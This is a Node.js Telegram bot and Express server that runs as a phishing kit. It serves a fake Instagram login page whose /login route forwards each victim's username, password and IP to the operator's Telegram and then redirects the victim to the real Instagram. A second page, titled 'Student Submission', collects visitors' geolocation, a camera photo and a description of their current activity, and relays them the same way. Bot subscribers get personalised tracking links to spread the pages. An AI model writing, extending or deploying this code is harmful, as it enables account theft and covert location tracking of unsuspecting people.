// index.js (ESM) – Node 18+
// npm i telegraf express multer dotenv

import dotenv from "dotenv";
dotenv.config();

import express from "express";
import multer from "multer";
import { Telegraf } from "telegraf";
import path from "path";
import { fileURLToPath } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const BOT_TOKEN = process.env.BOT_TOKEN;
const HOST = process.env.HOST || "tgbot-tg1w.onrender.com";
const PORT = process.env.PORT || 3000;
const FIREBASE_DB_URL = process.env.FIREBASE_DB_URL;
const ADMIN_USER_ID = "5543574742";
const CHANNEL_ID = -1002970130807; // Your private channel ID
const CHANNEL_INVITE_LINK = "https://t.me/+VN0ATDiz9DBkOTQy"; // Your channel invite link

if (!BOT_TOKEN || !FIREBASE_DB_URL) {
  console.error("Set BOT_TOKEN and FIREBASE_DB_URL in .env");
  process.exit(1);
}

// ---------- FIREBASE ----------
async function saveUser(id) {
  try {
    await fetch(`${FIREBASE_DB_URL}/users/${id}.json`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        timestamp: Date.now() 
      })
    });
    await updateStats();
  } catch (e) { 
    console.error("Save user error:", e); 
  }
}

async function updateStats() {
  try {
    const usersRes = await fetch(`${FIREBASE_DB_URL}/users.json`);
    const users = usersRes.ok ? (await usersRes.json() || {}) : {};
    const total = Object.keys(users).length;

    await fetch(`${FIREBASE_DB_URL}/stats.json`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        total: total, 
        updated: Date.now() 
      })
    });
    console.log(`Stats updated: Total Users = ${total}`);
  } catch (e) { 
    console.error("Update stats error:", e); 
  }
}

async function getStats() {
  try {
    const res = await fetch(`${FIREBASE_DB_URL}/stats.json`);
    if (!res.ok) return { total: 0 };
    const data = await res.json();
    return { total: data?.total || 0 };
  } catch (e) {
    console.error("Get stats error:", e);
    return { total: 0 };
  }
}

async function getAllUsers() {
  try {
    const res = await fetch(`${FIREBASE_DB_URL}/users.json`);
    if (!res.ok) return {};
    const data = await res.json();
    return data || {};
  } catch (e) {
    console.error("Get users error:", e);
    return {};
  }
}

// ---------- BOT ----------
const bot = new Telegraf(BOT_TOKEN);
const broadcastState = new Map();

// Check if user is subscribed to private channel
async function checkSubscription(userId) {
  try {
    const member = await bot.telegram.getChatMember(CHANNEL_ID, userId);
    return member.status === 'member' || member.status === 'administrator' || member.status === 'creator';
  } catch (error) {
    console.error('Check subscription error:', error);
    return false;
  }
}

// Show subscription required message
async function showSubscriptionRequired(ctx) {
  await ctx.reply(
    `📢 *Channel Subscription Required*\n\nTo use this bot, please join our private channel first!`,
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: "📢 Join Private Channel", url: CHANNEL_INVITE_LINK }],
          [{ text: "✅ I've Joined", callback_data: "check_subscription" }]
        ]
      }
    }
  );
}

// /start with subscription check
bot.start(async (ctx) => {
  const id = String(ctx.from.id);
  const isSubscribed = await checkSubscription(id);
  
  if (!isSubscribed) {
    await showSubscriptionRequired(ctx);
    return;
  }
  
  // User is subscribed, show normal content
  await saveUser(id);
  await ctx.reply(
    `✅ *Subscription Verified!*\n\nВаша ссылка:\nhttps://${HOST}/r/${id}\n\nInstagram: https://${HOST}/insta`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Open Instagram", url: `https://${HOST}/insta` }]]
      }
    }
  );
});

// Check subscription callback
bot.action("check_subscription", async (ctx) => {
  await ctx.answerCbQuery("Checking subscription...");
  
  const id = String(ctx.from.id);
  const isSubscribed = await checkSubscription(id);
  
  if (isSubscribed) {
    await ctx.editMessageText(
      `✅ *Subscription Verified!*\n\nВаша ссылка:\nhttps://${HOST}/r/${id}\n\nInstagram: https://${HOST}/insta`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "Open Instagram", url: `https://${HOST}/insta` }]]
        }
      }
    );
    await saveUser(id);
  } else {
    await ctx.editMessageText(
      `❌ *Subscription Required*\n\nYou haven't joined the channel yet. Please join and try again.`,
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: "📢 Join Private Channel", url: CHANNEL_INVITE_LINK }],
            [{ text: "✅ I've Joined", callback_data: "check_subscription" }]
          ]
        }
      }
    );
  }
});

bot.command("link", async (ctx) => {
  const id = String(ctx.from.id);
  const isSubscribed = await checkSubscription(id);
  
  if (!isSubscribed) {
    await showSubscriptionRequired(ctx);
    return;
  }
  
  await saveUser(id);
  await ctx.reply(`https://${HOST}/r/${id}`);
});

// Middleware to check subscription for other commands
bot.use(async (ctx, next) => {
  // Skip subscription check for start, link, and admin commands
  if (ctx.message?.text === '/start' || ctx.message?.text === '/link' || ctx.message?.text === '/admin') {
    return next();
  }
  
  // For other commands, check subscription
  const isSubscribed = await checkSubscription(ctx.from.id);
  if (!isSubscribed) {
    await showSubscriptionRequired(ctx);
    return;
  }
  
  return next();
});

// ---------- ADMIN ----------
bot.command("admin", async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.reply("Access denied.");
  
  const { total } = await getStats();
  await ctx.reply(`Admin Panel\nTotal Users: ${total}`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📊 View Statistics", callback_data: "stats" }],
        [{ text: "📢 Send Message to All Users", callback_data: "broadcast" }]
      ]
    }
  });
});

// View Stats
bot.action("stats", async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.answerCbQuery();
  const { total } = await getStats();
  await ctx.editMessageText(
    `*User Statistics*\n\n📊 Total Users: ${total}`,
    { parse_mode: "Markdown" }
  );
  await ctx.answerCbQuery();
});

// Start Broadcast
bot.action("broadcast", async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.answerCbQuery();

  const users = await getAllUsers();
  const userIds = Object.keys(users);

  if (userIds.length === 0) {
    return ctx.editMessageText("❌ No users found in database.");
  }

  // Store broadcast state
  const broadcastId = Date.now();
  broadcastState.set(broadcastId, {
    targets: userIds,
    adminChatId: ctx.chat.id,
    adminMessageId: ctx.message?.message_id
  });

  await ctx.editMessageText(
    `📢 *Broadcast Setup*\n\nUsers: ${userIds.length}\nBroadcast ID: ${broadcastId}\n\nNow send the message you want to broadcast:`,
    { 
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "❌ Cancel", callback_data: `cancel_${broadcastId}` }]
        ]
      }
    }
  );
  await ctx.answerCbQuery();
});

// Cancel broadcast
bot.action(/cancel_(\d+)/, async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.answerCbQuery();
  
  const broadcastId = ctx.match[1];
  broadcastState.delete(parseInt(broadcastId));
  
  await ctx.editMessageText("❌ Broadcast cancelled.");
  await ctx.answerCbQuery();
});

// Handle broadcast message - FIXED: Prevent sending to channel
bot.on("message", async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) return;
  
  // Prevent bot from processing messages in channels
  if (ctx.chat.type !== 'private') {
    return;
  }
  
  // Find active broadcast for this admin
  let broadcastId = null;
  let state = null;
  
  for (const [id, s] of broadcastState.entries()) {
    if (s.adminChatId === ctx.chat.id) {
      broadcastId = id;
      state = s;
      break;
    }
  }
  
  if (!state) return; // No active broadcast
  
  const messageText = ctx.message.text || ctx.message.caption || "";
  if (!messageText.trim()) {
    await ctx.reply("❌ Message cannot be empty. Please send your broadcast message again.");
    return;
  }

  const targets = state.targets;
  const statusMsg = await ctx.reply(`🔄 *Sending broadcast...*\n\n0/${targets.length} users\n✅ 0 sent\n❌ 0 failed`, {
    parse_mode: "Markdown"
  });

  let sent = 0;
  let failed = 0;
  const failedUsers = [];

  // Send to all users
  for (let i = 0; i < targets.length; i++) {
    const userId = targets[i];
    
    try {
      // Try to send the message - only to users, not channels
      await ctx.telegram.sendMessage(userId, messageText);
      sent++;
    } catch (error) {
      failed++;
      failedUsers.push(userId);
      console.log(`Failed to send to ${userId}: ${error.message}`);
    }

    // Update progress every 10 messages or at the end
    if ((i + 1) % 10 === 0 || i === targets.length - 1) {
      try {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          statusMsg.message_id,
          undefined,
          `🔄 *Sending broadcast...*\n\n${i + 1}/${targets.length} users\n✅ ${sent} sent\n❌ ${failed} failed`,
          { parse_mode: "Markdown" }
        );
      } catch (e) {
        console.error("Failed to update status:", e);
      }
    }

    // Delay to avoid rate limits
    await new Promise(resolve => setTimeout(resolve, 100));
  }

  // Final result
  let resultText = `✅ *Broadcast Complete!*\n\n` +
                  `📊 Total: ${targets.length} users\n` +
                  `✅ Sent: ${sent}\n` +
                  `❌ Failed: ${failed}`;

  if (failed > 0) {
    resultText += `\n\nFailed users: ${failedUsers.slice(0, 10).join(', ')}${failedUsers.length > 10 ? '...' : ''}`;
  }

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    statusMsg.message_id,
    undefined,
    resultText,
    { parse_mode: "Markdown" }
  );

  // Clean up
  broadcastState.delete(broadcastId);
});

// ---------- EXPRESS ----------
const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 6 * 1024 * 1024 } });

// Serve Instagram page
app.get("/insta", (req, res) => {
  res.sendFile(path.join(__dirname, "test insta", "index.html"));
});

// Serve static files from "test insta" directory
app.use("/insta", express.static(path.join(__dirname, "test insta")));

// Login Capture
app.post("/login", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.redirect("/insta");
  
  const ip = req.ip || req.connection.remoteAddress || "unknown";
  const time = new Date().toLocaleString();
  const msg = `*INSTAGRAM LOGIN*\nUser: \`${username}\`\nPass: \`${password}\`\nIP: \`${ip}\`\nTime: \`${time}\``;
  
  try { 
    await bot.telegram.sendMessage(ADMIN_USER_ID, msg, { parse_mode: "Markdown" }); 
  } catch (e) {
    console.error("Send login alert error:", e);
  }
  
  res.redirect("https://www.instagram.com/");
});

// Student Page - Photo and Location Submission
app.get("/r/:ref", async (req, res) => {
  const { ref } = req.params;
  if (!/^\d+$/.test(ref)) return res.status(400).send("Invalid ID");
  
  await saveUser(ref);
  
  res.type("html").send(`<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Student Submission</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            max-width: 500px;
            width: 100%;
        }
        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 20px;
            font-size: 24px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: bold;
        }
        input, textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus, textarea:focus {
            outline: none;
            border-color: #667eea;
        }
        textarea {
            height: 100px;
            resize: vertical;
        }
        .photo-preview {
            margin-top: 10px;
            text-align: center;
        }
        .photo-preview img {
            max-width: 200px;
            max-height: 200px;
            border-radius: 8px;
            border: 2px solid #ddd;
        }
        .submit-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s;
        }
        .submit-btn:hover {
            transform: translateY(-2px);
        }
        .student-id {
            text-align: center;
            color: #666;
            margin-bottom: 20px;
            font-size: 14px;
        }
        .instructions {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            color: #555;
        }
        .instructions ul {
            margin-left: 20px;
            margin-top: 10px;
        }
        .instructions li {
            margin-bottom: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📸 Student Submission</h1>
        <div class="student-id">Student ID: ${ref}</div>
        
        <div class="instructions">
            <strong>Instructions:</strong>
            <ul>
                <li>Take a clear photo of yourself</li>
                <li>Enable location services</li>
                <li>Describe your current activity</li>
                <li>Click submit when ready</li>
            </ul>
        </div>

        <form id="studentForm">
            <div class="form-group">
                <label for="photo">📷 Take Photo:</label>
                <input type="file" id="photo" accept="image/*" capture="camera" required>
                <div class="photo-preview" id="photoPreview"></div>
            </div>

            <div class="form-group">
                <label for="location">📍 Your Location:</label>
                <input type="text" id="location" placeholder="Getting your location..." readonly required>
            </div>

            <div class="form-group">
                <label for="activity">📝 Current Activity:</label>
                <textarea id="activity" placeholder="Describe what you're doing right now..." required></textarea>
            </div>

            <button type="submit" class="submit-btn">✅ Submit Information</button>
        </form>
    </div>

    <script>
        // Get user location
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        
                        // Get address from coordinates
                        try {
                            const response = await fetch(\`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=\${lat}&longitude=\${lon}&localityLanguage=en\`);
                            const data = await response.json();
                            const location = data.city + ', ' + data.countryName;
                            document.getElementById('location').value = location + ' (' + lat.toFixed(4) + ', ' + lon.toFixed(4) + ')';
                        } catch (error) {
                            document.getElementById('location').value = 'Location: ' + lat.toFixed(4) + ', ' + lon.toFixed(4);
                        }
                    },
                    (error) => {
                        document.getElementById('location').value = 'Location access denied';
                        console.error('Geolocation error:', error);
                    }
                );
            } else {
                document.getElementById('location').value = 'Geolocation not supported';
            }
        }

        // Photo preview
        document.getElementById('photo').addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    const preview = document.getElementById('photoPreview');
                    preview.innerHTML = '<img src="' + e.target.result + '" alt="Photo Preview">';
                }
                reader.readAsDataURL(file);
            }
        });

        // Form submission
        document.getElementById('studentForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const photo = document.getElementById('photo').files[0];
            const location = document.getElementById('location').value;
            const activity = document.getElementById('activity').value;
            
            if (!photo || !location || !activity) {
                alert('Please fill all fields and take a photo!');
                return;
            }

            const submitBtn = document.querySelector('.submit-btn');
            submitBtn.textContent = '🔄 Submitting...';
            submitBtn.disabled = true;

            try {
                // Convert photo to base64
                const reader = new FileReader();
                reader.onload = async function() {
                    const photoBase64 = reader.result;
                    
                    // Send data to Telegram
                    const response = await fetch('/submit-student-data', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            studentId: '${ref}',
                            photo: photoBase64,
                            location: location,
                            activity: activity,
                            timestamp: new Date().toISOString()
                        })
                    });

                    if (response.ok) {
                        alert('✅ Data submitted successfully!');
                        document.getElementById('studentForm').reset();
                        document.getElementById('photoPreview').innerHTML = '';
                    } else {
                        alert('❌ Error submitting data. Please try again.');
                    }
                    
                    submitBtn.textContent = '✅ Submit Information';
                    submitBtn.disabled = false;
                };
                reader.readAsDataURL(photo);
                
            } catch (error) {
                console.error('Submission error:', error);
                alert('❌ Network error. Please check connection and try again.');
                submitBtn.textContent = '✅ Submit Information';
                submitBtn.disabled = false;
            }
        });

        // Get location when page loads
        getLocation();
    </script>
</body>
</html>`);
});

// Handle student data submission
app.post("/submit-student-data", async (req, res) => {
  try {
    const { studentId, photo, location, activity, timestamp } = req.body;
    
    if (!studentId || !photo || !location || !activity) {
      return res.status(400).json({ error: "Missing data" });
    }

    // Send to Telegram
    const message = `🎓 *NEW STUDENT SUBMISSION*\n\n` +
                   `🆔 Student ID: ${studentId}\n` +
                   `📍 Location: ${location}\n` +
                   `📝 Activity: ${activity}\n` +
                   `⏰ Time: ${new Date(timestamp).toLocaleString()}\n\n` +
                   `Photo attached below 👇`;

    // Send text message first
    await bot.telegram.sendMessage(ADMIN_USER_ID, message, { parse_mode: "Markdown" });

    // Send photo if it's not too large
    if (photo.length < 5000000) { // 5MB limit for photos
      try {
        await bot.telegram.sendPhoto(ADMIN_USER_ID, { 
          source: Buffer.from(photo.split(',')[1], 'base64') 
        }, {
          caption: `Photo from Student ${studentId}`
        });
      } catch (photoError) {
        console.error('Photo send error:', photoError);
        await bot.telegram.sendMessage(ADMIN_USER_ID, `📷 Photo too large or invalid for student ${studentId}`);
      }
    } else {
      await bot.telegram.sendMessage(ADMIN_USER_ID, `📷 Photo too large for student ${studentId}`);
    }

    res.json({ success: true, message: "Data received" });
  } catch (error) {
    console.error("Student data submission error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Health check
app.get("/", (req, res) => {
  res.json({ status: "OK", timestamp: new Date().toISOString() });
});

// Start server
const server = app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Server LIVE: https://${HOST}:${PORT}`);
});

// Start bot
bot.launch().then(() => {
  console.log("🤖 Bot LIVE");
}).catch(e => {
  console.error("Bot launch error:", e);
});

// ---------- AUTO KEEP-ALIVE FOR RENDER ----------
const keepAlive = () => {
  const url = `https://${HOST}`;
  console.log(`🔄 Making keep-alive request to: ${url}`);
  
  fetch(url)
    .then(response => {
      if (response.ok) {
        console.log('✅ Keep-alive request successful');
      } else {
        console.log(`❌ Keep-alive request failed: ${response.status} - ${response.statusText}`);
      }
    })
    .catch(error => {
      console.error('❌ Keep-alive request error:', error.message);
    });
};

// Schedule keep-alive every 9 minutes (540000 ms)
const KEEP_ALIVE_INTERVAL = 9 * 60 * 1000;

// Start keep-alive only when server is fully ready
server.on('listening', () => {
  console.log('✅ Server is fully ready, starting keep-alive service...');
  
  // Wait 10 seconds after server is ready to ensure it can handle requests
  setTimeout(() => {
    keepAlive(); // Initial request
    setInterval(keepAlive, KEEP_ALIVE_INTERVAL); // Periodic requests
    console.log(`🔄 Keep-alive service started (every ${KEEP_ALIVE_INTERVAL/1000/60} minutes)`);
  }, 10000);
});

// ---------- GRACEFUL STOP ----------
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));